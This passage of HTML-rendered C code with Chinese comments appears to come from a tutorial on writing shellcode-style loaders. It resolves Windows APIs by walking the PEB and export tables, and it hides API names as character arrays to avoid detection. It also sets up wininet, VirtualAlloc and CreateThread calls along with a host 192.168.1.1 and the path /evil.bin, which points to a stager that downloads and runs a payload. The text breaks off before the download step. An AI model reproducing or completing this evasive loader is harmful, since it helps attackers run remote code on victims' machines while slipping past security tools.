c;<br>&#125;<br><br><span class="hljs-comment">// 不区分大小写的宽字符串比较函数（不修改原始字符串）</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">MyCompareStringW</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* str1, <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* str2)</span> </span>&#123;<br>    <span class="hljs-comment">// 空指针检查</span><br>    <span class="hljs-keyword">if</span> (str1 == <span class="hljs-literal">NULL</span> || str2 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 动态转换并比较字符，无需修改原始字符串</span><br>    <span class="hljs-keyword">while</span> (str1[i] != <span class="hljs-string">L&#x27;\0&#x27;</span> &amp;&amp; str2[i] != <span class="hljs-string">L&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-type">wchar_t</span> c1 = <span class="hljs-built_in">my_towlower</span>(str1[i]);<br>        <span class="hljs-type">wchar_t</span> c2 = <span class="hljs-built_in">my_towlower</span>(str2[i]);<br><br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        i++;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须同时到达字符串结尾才算相等</span><br>    <span class="hljs-keyword">return</span> (str1[i] == <span class="hljs-string">L&#x27;\0&#x27;</span> &amp;&amp; str2[i] == <span class="hljs-string">L&#x27;\0&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ASCII字符串比较函数</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">MyCompareStringA</span><span class="hljs-params">(CHAR str1[], CHAR str2[])</span> </span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (str1[i] &amp;&amp; str2[i]) &#123;<br>        <span class="hljs-keyword">if</span> (str1[i] != str2[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        i++;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须同时到达字符串结尾才算相等</span><br>    <span class="hljs-keyword">return</span> (str1[i] == <span class="hljs-string">&#x27;\0&#x27;</span> &amp;&amp; str2[i] == <span class="hljs-string">&#x27;\0&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 提取 DLL 名称的函数</span><br><span class="hljs-function"><span class="hljs-type">wchar_t</span>* <span class="hljs-title">ExtractDllName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* fullDllName)</span> </span>&#123;<br>    <span class="hljs-type">wchar_t</span>* fileName = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">wchar_t</span>* temp = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br><br>    <span class="hljs-comment">// 遍历并找到最后一个 &#x27;\\&#x27;，获取文件名部分</span><br>    <span class="hljs-keyword">while</span> (*temp) &#123;<br>        <span class="hljs-keyword">if</span> (*temp == <span class="hljs-string">L&#x27;\\&#x27;</span>) &#123;<br>            fileName = temp + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 更新文件名的位置</span><br>        &#125;<br>        temp++;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果没有找到 &#x27;\\&#x27;，则认为整个字符串就是文件名</span><br>    <span class="hljs-keyword">if</span> (!fileName) &#123;<br>        fileName = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> fileName;<br>&#125;<br><br><span class="hljs-function">FARPROC <span class="hljs-title">GetApiAddressByName</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* TargertDllName, <span class="hljs-type">char</span>* ApiName)</span> </span>&#123;<br>    <span class="hljs-comment">// 从获取 PEB 地址</span><br>    PPEB pPEB = (PPEB)__readgsqword(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-comment">// 获取 PEB.Ldr</span><br>    PPEB_LDR_DATA pLdr = pPEB-&gt;Ldr;<br><br>    <span class="hljs-comment">// 遍历模块列表</span><br>    PLIST_ENTRY pListHead = &amp;pLdr-&gt;InMemoryOrderModuleList;<br>    PLIST_ENTRY pCurrentEntry = pListHead-&gt;Flink;<br>    <span class="hljs-keyword">while</span> (pCurrentEntry &amp;&amp; pCurrentEntry != pListHead) &#123;<br>        PLDR_DATA_TABLE_ENTRY pEntry = <span class="hljs-built_in">CONTAINING_RECORD</span>(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);<br><br>        <span class="hljs-keyword">if</span> (pEntry &amp;&amp; pEntry-&gt;FullDllName.Buffer) &#123;<br>            <span class="hljs-type">wchar_t</span>* fullDllPath = pEntry-&gt;FullDllName.Buffer;<br><br>            <span class="hljs-comment">// 提取 DLL 名称</span><br>            <span class="hljs-type">wchar_t</span>* CurrentDllName = <span class="hljs-built_in">ExtractDllName</span>(fullDllPath);<br><br>            <span class="hljs-comment">// 比较 DLL 名称（不区分大小写）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">MyCompareStringW</span>(CurrentDllName, TargertDllName)) &#123;<br>                <span class="hljs-comment">// 找到目标 DLL</span><br>                HMODULE hModule = (HMODULE)pEntry-&gt;DllBase;<br><br>                <span class="hljs-comment">// 分析 PE 文件找到导出表</span><br>                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + ((PIMAGE_DOS_HEADER)hModule)-&gt;e_lfanew);<br>                PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +<br>                    pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><br>                <span class="hljs-comment">// 获取导出表的各个信息</span><br>                DWORD* pFunctionNames = (DWORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfNames);<br>                DWORD* pFunctionAddresses = (DWORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfFunctions);<br>                WORD* pFunctionOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfNameOrdinals);<br><br>                <span class="hljs-comment">// 遍历导出表，查找目标函数</span><br>                <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123;<br>                    <span class="hljs-type">char</span>* functionName = (<span class="hljs-type">char</span>*)((BYTE*)hModule + pFunctionNames[i]);<br><br>                    <span class="hljs-comment">// 找到函数名，获取其地址</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">MyCompareStringA</span>(functionName, ApiName)) &#123;<br>                        <span class="hljs-keyword">return</span> (FARPROC)((BYTE*)hModule + pFunctionAddresses[pFunctionOrdinals[i]]);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// 如果遍历完导出表未找到函数，返回 NULL</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>        &#125;<br><br>        pCurrentEntry = pCurrentEntry-&gt;Flink;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 未找到模块</span><br>&#125;<br><br>__declspec(<span class="hljs-built_in">code_seg</span>(<span class="hljs-string">&quot;.text$A&quot;</span>)) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 1. 函数声明</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(WINAPI* MyMessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT  uType)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* MyGetProcAddress)</span><span class="hljs-params">(HMODULE hModule, LPCSTR  lpProcName)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* MyLoadLibraryA)</span><span class="hljs-params">(LPCSTR lpLibFileName)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HINTERNET</span><span class="hljs-params">(WINAPI* MyInternetOpenA)</span><span class="hljs-params">(LPCSTR lpszAgent, DWORD  dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD  dwFlags)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HINTERNET</span><span class="hljs-params">(WINAPI* MyInternetConnectA)</span><span class="hljs-params">(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HINTERNET</span><span class="hljs-params">(WINAPI* MyHttpOpenRequestA)</span><span class="hljs-params">(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* MyHttpSendRequestA)</span><span class="hljs-params">(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* MyInternetReadFile)</span><span class="hljs-params">(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* MyInternetCloseHandle)</span><span class="hljs-params">(HINTERNET hInternet)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">LPVOID</span> <span class="hljs-params">(WINAPI* MyVirtualAlloc)</span><span class="hljs-params">(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(WINAPI* MySleep)</span><span class="hljs-params">(DWORD dwMilliseconds)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">VOID</span> <span class="hljs-params">(WINAPI* MyRtlMoveMemory)</span><span class="hljs-params">(PVOID Destination, PVOID Source, SIZE_T Length)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HANDLE</span> <span class="hljs-params">(WINAPI* MyCreateThread)</span><span class="hljs-params">(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span> <span class="hljs-params">(WINAPI* MyWaitForSingleObject)</span><span class="hljs-params">(HANDLE hHandle, DWORD dwMilliseconds)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span> <span class="hljs-params">(WINAPI* MyCloseHandle)</span><span class="hljs-params">(HANDLE hObject)</span></span>;<br>   <br>    <span class="hljs-comment">// 2. 需要用到的API和DLL的名称</span><br>    CHAR internetOpenA[] = &#123; <span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR internetConnectA[] = &#123; <span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR httpOpenRequestA[] = &#123; <span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR httpSendRequestA[] = &#123; <span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR internetReadFile[] = &#123; <span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR internetCloseHandle[] = &#123; <span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR virtualAlloc[] = &#123; <span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR messageBoxA[] = &#123; <span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR sleep[] = &#123; <span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR rtlMoveMemory[] = &#123; <span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR createThread[] = &#123; <span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR waitForSingleObject[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR closeHandle[] = &#123; <span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br>    CHAR loadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR getProcAddress[] = &#123; <span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR kernel32[] = &#123; <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR user32[] = &#123; <span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR wininet[] = &#123; <span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR UA[] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span>&#125;;<br>    CHAR IP[] = &#123; <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR PATH[] = &#123; <span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span>&#125;;<br>    CHAR Method[] = &#123;<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span>&#125;;<br>    CHAR Version[] = &#123; <span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br>    <span class="hljs-comment">// 3.动态获取API函数</span><br>    MyGetProcAddress pGetProcAddress = (MyGetProcAddress)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, getProcAddress);<br>    MyLoadLibraryA pLoadLibraryA = (MyLoadLibraryA)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, loadLibraryA);<br>    MyVirtualAlloc pVirtualAlloc = (MyVirtualAlloc)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, virtualAlloc);<br>    MySleep pSleep = (MySleep)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, sleep);<br>    MyRtlMoveMemory pRtlMoveMemory = (MyRtlMoveMemory)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, rtlMoveMemory);<br>    MyCreateThread pCreateThread = (MyCreateThread)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, createThread);<br>    MyWaitForSingleObject pWaitForSingleObject = (MyWaitForSingleObject)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, waitForSingleObject);<br>    MyCloseHandle pCloseHandle = (MyCloseHandle)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, closeHandle);<br>    MyMessageBoxA pMessageBoxA = (MyMessageBoxA)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(user32), messageBoxA);<br>    <br>    